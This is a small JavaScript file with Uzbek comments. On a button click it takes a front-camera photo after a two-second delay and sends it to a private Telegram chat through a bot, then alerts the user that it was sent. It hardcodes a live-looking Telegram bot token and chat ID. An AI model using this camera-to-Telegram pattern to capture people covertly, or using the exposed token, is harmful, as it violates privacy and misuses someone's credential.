const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const takePhoto = document.getElementById("takePhoto");

// 🔑 Seniki bo'lgan token
const BOT_TOKEN = "8351915395:AAGd1cJAgkQPxSm7CeW7mXBTu1oQxRV6ja0";

// ⛔ Bu joyni @userinfobot dan olgan ID bilan to'ldir
const CHAT_ID = "6497648973";

takePhoto.addEventListener("click", (e) => {
  e.preventDefault();

  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
      video.srcObject = stream;

      setTimeout(() => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        stream.getTracks().forEach(track => track.stop());

        canvas.toBlob((blob) => {
          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", blob, "selfie.png");

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          })
          .then(res => res.json())
          .then(data => {
            console.log("✅ Rasm Telegramga yuborildi!", data);
            alert("✅ Rasm Telegramga yuborildi!");
          })
          .catch(err => {
            console.error(err);
            alert("Xato: " + err);
          });
        }, "image/png");
      }, 2000);
    })
    .catch(err => {
      alert("Camera error: " + err);
    });
});
